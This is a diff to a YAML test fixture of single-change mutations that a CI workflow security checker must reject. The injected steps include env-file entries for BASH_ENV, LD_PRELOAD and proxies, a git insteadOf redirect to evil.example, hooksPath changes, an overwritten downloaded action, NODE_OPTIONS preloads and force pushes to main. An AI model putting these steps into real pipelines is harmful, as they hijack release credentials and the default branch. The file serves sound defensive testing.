@@ -1,20 +1,24 @@
 # One-change mutations of the realistic consumer workflow set (the queue
-# corpus base: a release job with its tag step, two bot jobs, a guard, and
-# CI). The harness copies the base into a temp dir, proves the copy passes,
-# then replaces find with replace in one file (find must occur exactly once,
-# so only that place changes) and runs the production loaders and checker.
-# rules is the exact set of rules that must fire, empty for a change that
-# must pass; config_error is the code the release config loader must refuse
-# with instead; want_contains are fragments the diagnostics must carry.
+# corpus base: a planning job and the release job it hands over to, two bot
+# jobs each split the same way, a guard, and CI). The harness copies the base
+# into a temp dir, proves the copy passes, then replaces find with replace in
+# one file (find must occur exactly once, so only that place changes) and
+# runs the production loaders and checker. rules is the exact set of rules
+# that must fire, empty for a change that must pass; config_error is the code
+# the release config loader must refuse with instead; want_contains are
+# fragments the diagnostics must carry.
 #
 # The rows cover the default branch in every refspec form against each job
 # class that may hold a credential, the push options and refspecs that name
-# no single branch, every form that pushed the default branch past the
-# earlier reader with (a variable command word, a substitution, a pipe or a
-# here-document into bash, python, node and perl, a repository script, an
-# actions/github-script step), the environment and shell a credential step
-# may not change, a bot branch on the default branch, and the general steps
-# a credential job may still run because they hold no credential.
+# no single branch, a single-sided tag refspec, every form that pushed the
+# default branch past the earlier reader (a variable command word, a
+# substitution, a pipe or a here-document into bash, python, node and perl, a
+# repository script, an actions/github-script step), the environment and
+# shell a credential step may not change, a bot branch on the default
+# branch, every way a step before the credential step could tamper with it
+# (an env or path file entry, a git config, a rewritten downloaded action, an
+# action env, a download into .git, a checkout of another ref), and the
+# general steps the jobs without a credential may still run.
 #
 # required_names is the manifest: every case must be listed and every listed
 # case must exist.
@@ -55,6 +59,7 @@ required_names:
   - cut-delete-refspec
   - release-tag-literal
   - release-tag-to-branch
+  - release-tag-single-sided
   - release-git-config-option
   - release-git-directory-option
   - release-in-substitution
@@ -76,11 +81,24 @@ required_names:
   - release-shell-override
   - release-merge-admin
   - release-pr-create-other-head
+  - release-pr-number-unguarded
   - release-queue-mutation
   - release-config-default-branch
-  - general-interpreters-in-release-job
-  - general-repo-scripts-in-release-job
-  - general-shell-forms-in-bot-job
+  - tamper-env-file-bash-env
+  - tamper-env-file-ld-preload
+  - tamper-env-file-proxy
+  - tamper-path-file-fake-git
+  - tamper-git-config-insteadof
+  - tamper-git-config-hookspath
+  - tamper-rewrite-downloaded-action
+  - tamper-fetch-default-branch
+  - tamper-action-env-node-options
+  - tamper-download-into-git
+  - tamper-checkout-other-ref
+  - general-interpreters-in-planning-job
+  - general-repo-scripts-in-planning-job
+  - general-env-and-path-files-in-planning-job
+  - general-shell-forms-in-bot-prepare-job
 cases:
   - name: release-main
     workflow: release-batch.yml
@@ -108,73 +126,73 @@ cases:
     want_contains: ["the refspec \"+HEAD:main\" is not the job's own bot branch \"automation/release\""]
   - name: cut-main
     workflow: cut-release.yml
-    find: "push origin HEAD:automation/cut-release"
-    replace: "push origin main"
+    find: "push --force origin automation/cut-release"
+    replace: "push --force origin main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"main\" is not the job's own bot branch \"automation/cut-release\""]
   - name: cut-head-main
     workflow: cut-release.yml
-    find: "push origin HEAD:automation/cut-release"
-    replace: "push origin HEAD:main"
+    find: "push --force origin automation/cut-release"
+    replace: "push --force origin HEAD:main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"HEAD:main\" is not the job's own bot branch \"automation/cut-release\""]
   - name: cut-refs-heads-main
     workflow: cut-release.yml
-    find: "push origin HEAD:automation/cut-release"
-    replace: "push origin refs/heads/main"
+    find: "push --force origin automation/cut-release"
+    replace: "push --force origin refs/heads/main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"refs/heads/main\" is not the job's own bot branch \"automation/cut-release\""]
   - name: cut-force-head-main
     workflow: cut-release.yml
-    find: "push origin HEAD:automation/cut-release"
-    replace: "push origin +HEAD:main"
+    find: "push --force origin automation/cut-release"
+    replace: "push --force origin +HEAD:main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"+HEAD:main\" is not the job's own bot branch \"automation/cut-release\""]
   - name: vendor-main
     workflow: nix-vendor-hash.yml
-    find: "push --force-with-lease origin HEAD:automation/vendor-hash"
-    replace: "push --force-with-lease origin main"
+    find: "push --force origin automation/vendor-hash"
+    replace: "push --force origin main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"main\" is not the job's own bot branch \"automation/vendor-hash\""]
   - name: vendor-head-main
     workflow: nix-vendor-hash.yml
-    find: "push --force-with-lease origin HEAD:automation/vendor-hash"
-    replace: "push --force-with-lease origin HEAD:main"
+    find: "push --force origin automation/vendor-hash"
+    replace: "push --force origin HEAD:main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"HEAD:main\" is not the job's own bot branch \"automation/vendor-hash\""]
   - name: vendor-refs-heads-main
     workflow: nix-vendor-hash.yml
-    find: "push --force-with-lease origin HEAD:automation/vendor-hash"
-    replace: "push --force-with-lease origin refs/heads/main"
+    find: "push --force origin automation/vendor-hash"
+    replace: "push --force origin refs/heads/main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"refs/heads/main\" is not the job's own bot branch \"automation/vendor-hash\""]
   - name: vendor-force-head-main
     workflow: nix-vendor-hash.yml
-    find: "push --force-with-lease origin HEAD:automation/vendor-hash"
-    replace: "push --force-with-lease origin +HEAD:main"
+    find: "push --force origin automation/vendor-hash"
+    replace: "push --force origin +HEAD:main"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"+HEAD:main\" is not the job's own bot branch \"automation/vendor-hash\""]
   - name: release-tag-step-main
     workflow: release-batch.yml
-    find: "push origin \"${{ steps.verdict.outputs.candidate }}:refs/tags/${{ steps.verdict.outputs.tag }}\""
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
     replace: "push origin main"
     rules: [credential-steps-run-one-template, release-actions-gated]
     want_contains: ["the refspec \"main\" is not the job's own bot branch \"automation/release\"", "no step pushes a tag"]
   - name: release-tag-step-head-main
     workflow: release-batch.yml
-    find: "push origin \"${{ steps.verdict.outputs.candidate }}:refs/tags/${{ steps.verdict.outputs.tag }}\""
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
     replace: "push origin HEAD:main"
     rules: [credential-steps-run-one-template, release-actions-gated]
     want_contains: ["the refspec \"HEAD:main\" is not the job's own bot branch \"automation/release\"", "no step pushes a tag"]
   - name: release-tag-step-refs-heads-main
     workflow: release-batch.yml
-    find: "push origin \"${{ steps.verdict.outputs.candidate }}:refs/tags/${{ steps.verdict.outputs.tag }}\""
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
     replace: "push origin refs/heads/main"
     rules: [credential-steps-run-one-template, release-actions-gated]
     want_contains: ["the refspec \"refs/heads/main\" is not the job's own bot branch \"automation/release\"", "no step pushes a tag"]
   - name: release-tag-step-force-head-main
     workflow: release-batch.yml
-    find: "push origin \"${{ steps.verdict.outputs.candidate }}:refs/tags/${{ steps.verdict.outputs.tag }}\""
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
     replace: "push origin +HEAD:main"
     rules: [credential-steps-run-one-template, release-actions-gated]
     want_contains: ["the refspec \"+HEAD:main\" is not the job's own bot branch \"automation/release\"", "no step pushes a tag"]
@@ -264,40 +282,46 @@ cases:
     want_contains: ["the refspec \"automation/cut-release\" is not the job's own bot branch \"automation/release\""]
   - name: cut-tag
     workflow: cut-release.yml
-    find: "push origin HEAD:automation/cut-release"
+    find: "push --force origin automation/cut-release"
     replace: "push origin HEAD:refs/tags/v9.9.9"
     rules: [credential-steps-run-one-template]
     want_contains: ["a bot job may not run the push-release-tag template"]
   - name: vendor-all
     workflow: nix-vendor-hash.yml
-    find: "push --force-with-lease origin HEAD:automation/vendor-hash"
+    find: "push --force origin automation/vendor-hash"
     replace: "push origin --all"
     rules: [credential-steps-run-one-template]
     want_contains: ["the push passes option \"--all\""]
   - name: vendor-other-bot
     workflow: nix-vendor-hash.yml
-    find: "push --force-with-lease origin HEAD:automation/vendor-hash"
-    replace: "push --force-with-lease origin HEAD:automation/release"
+    find: "push --force origin automation/vendor-hash"
+    replace: "push --force origin HEAD:automation/release"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \"HEAD:automation/release\" is not the job's own bot branch \"automation/vendor-hash\""]
   - name: cut-delete-refspec
     workflow: cut-release.yml
-    find: "push origin HEAD:automation/cut-release"
+    find: "push --force origin automation/cut-release"
     replace: "push origin :automation/cut-release"
     rules: [credential-steps-run-one-template]
     want_contains: ["the refspec \":automation/cut-release\" is not the job's own bot branch \"automation/cut-release\""]
   - name: release-tag-literal
     workflow: release-batch.yml
-    find: "push origin \"${{ steps.verdict.outputs.candidate }}:refs/tags/${{ steps.verdict.outputs.tag }}\""
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
     replace: "push origin refs/tags/v9.9.9"
     rules: [credential-steps-run-one-template]
-    want_contains: ["is not [<candidate>:]refs/tags/<tag> with both read from the planner's outputs"]
+    want_contains: ["is not \"refs/tags/${TAG}:refs/tags/${TAG}\""]
   - name: release-tag-to-branch
     workflow: release-batch.yml
-    find: "push origin \"${{ steps.verdict.outputs.candidate }}:refs/tags/${{ steps.verdict.outputs.tag }}\""
-    replace: "push origin \"refs/tags/${{ steps.verdict.outputs.tag }}:refs/heads/main\""
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
+    replace: "push origin \"refs/tags/${TAG}:refs/heads/main\""
     rules: [credential-steps-run-one-template]
-    want_contains: ["is not [<candidate>:]refs/tags/<tag>"]
+    want_contains: ["is not \"refs/tags/${TAG}:refs/tags/${TAG}\""]
+  - name: release-tag-single-sided
+    workflow: release-batch.yml
+    find: "push origin \"refs/tags/${TAG}:refs/tags/${TAG}\""
+    replace: "push origin \"refs/tags/${TAG}\""
+    rules: [credential-steps-run-one-template]
+    want_contains: ["is not \"refs/tags/${TAG}:refs/tags/${TAG}\""]
   - name: release-git-config-option
     workflow: release-batch.yml
     find: "git -c http.extraheader=\"AUTHORIZATION: bearer ${APP_TOKEN}\" push --force-with-lease origin automation/release"
@@ -396,8 +420,8 @@ cases:
     want_contains: ["it holds \"&\" outside quotes"]
   - name: release-github-script
     workflow: release-batch.yml
-    find: "      - id: gate\n"
-    replace: "      - id: script\n        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea\n        with:\n          github-token: ${{ steps.mint.outputs.token }}\n          script: |\n            await github.rest.git.updateRef({owner: context.repo.owner, repo: context.repo.repo, ref: 'heads/main', sha: context.sha, force: true})\n      - id: gate\n"
+    find: "      - id: fetch-tag\n"
+    replace: "      - id: script\n        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea\n        with:\n          github-token: ${{ steps.mint.outputs.token }}\n          script: |\n            await github.rest.git.updateRef({owner: context.repo.owner, repo: context.repo.repo, ref: 'heads/main', sha: context.sha, force: true})\n      - id: fetch-tag\n"
     rules: [credentials-stay-in-listed-jobs, credential-jobs-use-pinned-actions, release-actions-gated]
     want_contains: ["uses \"actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea\", which is not an allowed action", "reads steps.mint (the minted App token) in with"]
   - name: release-env-bash-env
@@ -424,10 +448,16 @@ cases:
     replace: "gh pr create --head main"
     rules: [credential-steps-run-one-template]
     want_contains: ["gh pr create opens from \"main\", not the job's own bot branch \"automation/release\""]
+  - name: release-pr-number-unguarded
+    workflow: release-batch.yml
+    find: "-- \"${PR_NUMBER}\""
+    replace: "\"${PR_NUMBER}\""
+    rules: [credential-steps-run-one-template]
+    want_contains: ["before \"--\", so a value that starts with '-' would be read as a flag"]
   - name: release-queue-mutation
     workflow: release-batch.yml
-    find: "-f query='query("
-    replace: "-f query='mutation("
+    find: "      - id: arm\n"
+    replace: "      - id: queue-write\n        if: \"!cancelled() && needs.plan.outputs.action == 'open-pr' && needs.plan.outputs.push == 'true'\"\n        env:\n          GH_TOKEN: ${{ steps.mint.outputs.token }}\n        run: |\n          gh api graphql -f query='mutation { mergeQueue: updateRef(input:{}) { clientMutationId } }'\n      - id: arm\n"
     rules: [credential-steps-run-one-template]
     want_contains: ["the GraphQL document is not one query"]
   - name: release-config-default-branch
@@ -437,21 +467,93 @@ cases:
     rules: []
     config_error: config-invalid
     want_contains: ["bot_branches entry \"release\" names branch \"main\", which is not under \"automation/\""]
-  - name: general-interpreters-in-release-job
+  - name: tamper-env-file-bash-env
     workflow: release-batch.yml
-    find: "      - id: push\n"
-    replace: "      - id: notes\n        run: |\n          python3 -c \"print('notes')\" > notes.txt\n          node -e \"console.log('notes')\" >> notes.txt\n          perl -e 'print \"notes\\n\"' >> notes.txt\n      - id: push\n"
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: echo \"BASH_ENV=$PWD/bundles/env.sh\" >> \"$GITHUB_ENV\"\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["jobs.release step \"tamper\" is a general step"]
+  - name: tamper-env-file-ld-preload
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: echo \"LD_PRELOAD=$PWD/bundles/hook.so\" >> \"$GITHUB_ENV\"\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["jobs.release step \"tamper\" is a general step"]
+  - name: tamper-env-file-proxy
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: echo \"HTTPS_PROXY=http://127.0.0.1:8080\" >> \"$GITHUB_ENV\"\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["jobs.release step \"tamper\" is a general step"]
+  - name: tamper-path-file-fake-git
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: echo \"$PWD/bundles/bin\" >> \"$GITHUB_PATH\"\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["jobs.release step \"tamper\" is a general step"]
+  - name: tamper-git-config-insteadof
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: git config url.https://evil.example/.insteadOf https://github.com/\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["the command is none of the plumbing templates"]
+  - name: tamper-git-config-hookspath
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: git config core.hooksPath bundles/hooks\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["the command is none of the plumbing templates"]
+  - name: tamper-rewrite-downloaded-action
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: cp bundles/main.cjs \"$RUNNER_WORKSPACE/../../_actions/actions/create-github-app-token/bcd2ba49218906704ab6c1aa796996da409d3eb1/dist/main.cjs\"\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["the command is none of the plumbing templates"]
+  - name: tamper-fetch-default-branch
+    workflow: release-batch.yml
+    find: "      - id: mint\n"
+    replace: "      - id: tamper\n        run: git fetch bundles/release.bundle automation/release:main\n      - id: mint\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["does not fetch the job's own bot branch"]
+  - name: tamper-action-env-node-options
+    workflow: release-batch.yml
+    find: "      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n"
+    replace: "      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\n        env:\n          NODE_OPTIONS: --require ./bundles/hook.js\n"
+    rules: [credential-jobs-run-no-general-steps]
+    want_contains: ["runs with env NODE_OPTIONS"]
+  - name: tamper-download-into-git
+    workflow: release-batch.yml
+    find: "          path: bundles\n      - id: mint"
+    replace: "          path: .git\n      - id: mint"
+    rules: [credential-jobs-use-pinned-actions]
+    want_contains: ["downloads into \".git\" instead of a literal subdirectory"]
+  - name: tamper-checkout-other-ref
+    workflow: release-batch.yml
+    find: "          persist-credentials: false\n      - uses: actions/download-artifact"
+    replace: "          persist-credentials: false\n          ref: main\n      - uses: actions/download-artifact"
+    rules: [credential-jobs-use-pinned-actions]
+    want_contains: ["passes input ref, which actions/checkout may not take"]
+  - name: general-interpreters-in-planning-job
+    workflow: release-batch.yml
+    find: "      - id: bundle\n"
+    replace: "      - id: notes\n        run: |\n          python3 -c \"print('notes')\" > notes.txt\n          node -e \"console.log('notes')\" >> notes.txt\n          perl -e 'print \"notes\\n\"' >> notes.txt\n      - id: bundle\n"
     rules: []
     want_contains: []
-  - name: general-repo-scripts-in-release-job
+  - name: general-repo-scripts-in-planning-job
     workflow: release-batch.yml
-    find: "      - id: push\n"
-    replace: "      - id: prepare\n        run: |\n          ./scripts/prepare.sh\n          bash scripts/prepare.sh\n      - id: push\n"
+    find: "      - id: bundle\n"
+    replace: "      - id: prepare\n        run: |\n          ./scripts/prepare.sh\n          bash scripts/prepare.sh\n      - id: bundle\n"
     rules: []
     want_contains: []
-  - name: general-shell-forms-in-bot-job
+  - name: general-env-and-path-files-in-planning-job
+    workflow: release-batch.yml
+    find: "      - id: bundle\n"
+    replace: "      - id: shellenv\n        run: |\n          echo \"BASH_ENV=$PWD/env.sh\" >> \"$GITHUB_ENV\"\n          echo \"$PWD/bin\" >> \"$GITHUB_PATH\"\n          git config core.hooksPath .hooks\n      - id: bundle\n"
+    rules: []
+    want_contains: []
+  - name: general-shell-forms-in-bot-prepare-job
     workflow: cut-release.yml
-    find: "      - id: push\n"
-    replace: "      - id: inspect\n        run: |\n          G=git; $G log -1\n          echo \"git status\" | bash\n      - id: push\n"
+    find: "      - id: commit\n"
+    replace: "      - id: inspect\n        run: |\n          G=git; $G log -1\n          echo \"git status\" | bash\n      - id: commit\n"
     rules: []
     want_contains: []
